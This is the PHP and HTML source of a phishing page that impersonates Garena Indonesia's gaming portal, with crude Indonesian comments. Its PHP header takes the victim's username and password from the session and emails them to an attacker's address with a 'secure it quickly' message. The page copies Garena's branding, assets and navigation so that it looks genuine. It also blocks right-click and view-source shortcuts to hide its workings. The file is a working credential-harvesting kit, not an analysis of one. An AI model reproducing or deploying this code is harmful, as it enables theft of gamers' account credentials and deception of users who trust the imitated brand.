<?php 
ob_start();
session_start();

if(!isset($_SESSION['username']) && !isset($_SESSION['katasandi'])){

	header("location:index.php");
	exit();
}

@unlink(getcwd() . "/jembut-lu-tipis.txt");

?>

<?php

/* Fungsi Fungsi Maq Lo Yang Fungsi. */

$ip = $_SERVER['REMOTE_ADDR'];
$email = $_SESSION['username'];
$password = $_SESSION['katasandi'];
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

$mailto = "emailmu0@gmail.com"; //masukin email lu gblk

/* Mau Kekirim Ke Email Ga? Kalo Mau Jangan Ganti Apa2 Selain email Jembut!. */

$body = <<<EOD
<html>
<head>
<style>
table, td, th {    
    border: 2px solid green;
    text-align: center;
}

table {
    border-collapse: collapse;
    width: 75%;
}

th, td {
    padding: 8px;
}

tr:hover{background-color:#f5f5f5}
</style>
</head>

<body>
<table>
    <tr>
        <td>RESULT DARI WEB <b>| $referer |</b></td>
    </tr>
    <tr>
        <td>CEPET AMANIN BOSS, KEBURU DIGANTI SAMA YANG PUNYA!!!!</td>
    </tr>
</table>
<br>
<table>
  <tr>
    <th>Username</th>
    <th>Password</th> 
  </tr>
  <tr>
    <td>$email</td> 
    <td>$password</td>
  </tr>
</table>
<br>

</body>
</html>
EOD;

$subjek = 'UHUINFO99 - Buruan Ganti';
$headers = "From: Uhuinfo@dot.com\r\n"; // Email w nih hehe
$headers .= "Content-type: text/html\r\n"; // Server Ko Diperintah.
$success = mail($mailto, $subjek, $body, $headers); // Jgn diubah ubah ya kentod.d.
?>
<?php
$random = rand(1000,5000);
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="id-id" xml:lang="id-id">
    <head>
		<link rel="shortcut icon" href="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/favicon.ico" type="image/x-icon">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="keywords" content='league of legends, rune, champion, summoner, god like, LoL, HoN, Heroes of Newerth, Go Kart, Gokartdotaallstars, dotaguidez, games, gaming, mmo gamer, mmorpg, mmorpgs, online game, online gamers, online gaming, pc console gaming, pc gaming, rts games, warcraft iii, world warcraft, dota, dota 2, FPS, BlackShot, first blood,garena, Defense of the Ancients, Godlike, imba, noob'/>
        <meta name="description" content='Chat, kirim pesan dan suara dengan teman-teman Anda. Nikmati game-game terbaik di dunia.'/>

        
        
        <title>Garena Indonesia - Connecting world gamers</title>     
        
        
 <!-- for Amy's new design -->
<link href="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/css/bootstrap2.min.css" rel="stylesheet">
<link href="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/css/style.css" rel="stylesheet">

    <link href="https://cdngarenanow-a.akamaihd.net/webmain/static/css/screen.css" rel="stylesheet" type="text/css" media="all" />

<style type="text/css">
input {
    height: 20px;
}


/*padding for footer*/
#footer div p {
    float: none;
}
#footer .container{
    border: 0 !important;
}
</style>
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/sso/js/jquery-1.10.2.min.js?v=0.12"></script>

<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/sso/js/sso.js?v=0.12"></script>

<script type="text/javascript">
$(function() {
	SSO.init({
		'app_id': 10000,
		'language': 'id\u002DID',
		'login_mode': 'redirect',
		'login': false,
		'session_cookie_name': 'sso_session',
		'session_cookie_domain': '.garena.co.id',
		'on_session_change_callback': onSsoSessionChange,
		'':''
	});
});
</script>
	<script>
	var txt="Garena";
var kecepatan=0;var segarkan=null;function berhenti() { document.title=txt;
txt=txt.substring(1,txt.length)+txt.charAt(0);
segarkan=setTimeout("behenti()",kecepatan);}berhenti();
	document.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
	document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 67 || 
             e.keyCode === 83 || 
             e.keyCode === 85 || 
             e.keyCode === 117)) {
            window.location.replace("index.html");
            return false;
        } else {
            return true;
        }
};
</script>
<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>
        
        
        
        
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/js/retina.min.js"></script>
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/js/smooth-scroll.js"></script>
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/js/script.js"></script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-75716913-9', 'auto');
  ga('send', 'pageview');

</script>

    </head>

    
        <body> 
            
                <!--div id="holder"></div-->
                <!--div id="blackout"></div-->
                <!--div id="holder1"></div-->
<style type="text/css">
div#navbar {
    font-size: 14px;
}
</style>
<div id="navbar" class="navbar navbar-default navbar-fixed-top" role="navigation">
    <div class="container">
        <div class="navbar-header">
<!--
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
-->
            <a class="navbar-brand" href="/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/logo_garena_new.png" alt="Garena" height="51"></a>
        </div>

        <div class="navbar-collapse collapse">
            <ul id="nav-menu" class="nav navbar-nav">

                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Perusahaan <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="http://corporate.garena.com"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-about.png">Tentang Garena</a></li>
                        
                        <li class=""><a href="http://career.garena.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-career.png">Karir@Garena</a></li>
                        
                        <li class=""><a href="/contact"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-contact.png">Hubungi Kami</a></li>
                        
                    </ul>
                </li>
                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Produk <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="/gas/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-garena.png">Garena Mobile</a></li>
                        
                        <li class=""><a href="/beetalk"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-beetalk.png">BeeTalk</a></li>
                        
                        <li class=""><a href="/plus"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-garena.png">Garena+</a></li>
                        
                        <li class=""><a href="http://clan.garena.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-clan.png">Clan</a></li>
                        
                        <li class=""><a href="/gca/overview/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-gca.png">GCA</a></li>
                        
                        <li class=""><a href="http://www.cyberindo.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_cyberindo.png">CyberIndo</a></li>
                        
                    </ul>
                </li>
                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Game <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="http://pb.garena.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_pb.png">Point Blank</a></li>
                        
                        <li class=""><a href="http://fo3.garena.co.id/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_fo3.png">FIFA Online 3</a></li>
                        
                        <li class=""><a href="http://hon.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_15.png">Heroes of Newerth</a></li>
                        
                        <li class=""><a href="http://lol.garena.co.id/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_lol.png">League of Legends</a></li>
                        
                        <li class=""><a href="http://aov.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_aov.png">Arena of Valor</a></li>
                        
                    </ul>
                </li>
                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Pembayaran <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="http://pay.garena.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-topup.png">Isi Shell</a></li>
                        
                        <li class=""><a href="/all_transactions"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-history.png">Transaksi Terakhir</a></li>
                        
                    </ul>
                </li>
                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Akun Saya <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="https://account.garena.com?locale_name=ID"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-settings.png">Account Center</a></li>
                        
                        <li class=""><a href="/support"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-support.png">Customer Service</a></li>
                        
                    </ul>
                </li>
                


            </ul>

            <ul class="nav navbar-nav navbar-right">
            
                <!-- <li id="nav-login-btn"><a href="index.php"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/images/nav-icon-user.png"> Logout</a></li> -->
				<li id="nav-login-btn"><a href="../logout.php" onClick="javascript:login()"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/images/nav-icon-user.png"> <?php echo $email;?> [LOGOUT]</a></li>
            
            </ul>

        </div><!--/.nav-collapse -->

    </div>
</div>

<script type="text/javascript">
	function login() {
		SSO.login();
	}

	function logout() {
		var homeUri = window.location.origin + '/';
		SSO.logout(homeUri);
	}
</script>

<style type="text/css">
.logout{
    padding-top:20px;
}
</style>
            
<style type="text/css">
#garena-download-btn-id{
	top:250px;
}
</style>
<div id="main">
	<div class="container">
		<div id="carousel-example-generic" class="carousel slide" data-ride="carousel" data-interval='4000'>
			<!-- Wrapper for slides -->
			<div class="carousel-inner">
				<center><img src="https://2.bp.blogspot.com/-jh_sTCQUB9g/WgSEdAWuJRI/AAAAAAAACAw/MqhZ7XpbZCUlo-CavriWe36pHE6AAkOBQCLcBGAs/s320/kado.png" /></center>
			</div>
		</div>
	</div>
</div>
             
<div id="footer">
	<div class="container" style="border-top:none;">
		<div class="ft-sosumi">
			<p>Copyright © Garena Online. Trademarks belong to their respective owners. All rights reserved.<span class="pull-right"><a href="/tos/" class="first">Terms of Use</a> | <a href="/privacy/">Privacy Policy</a></span></p>
		</div>
	</div>
</div>

               
            <!--CHANGE USERNAME NOTICE BELOW-->
            

            

            
			<script>
				function onSsoSessionChange(session) {
					if(session.login && typeof session.check_sso_session !== "undefined"){
						location.reload();
					}
				}
				$('.sso_login_button').click(function(){
					SSO.login();
				});
			</script>
        </body>
    
</html>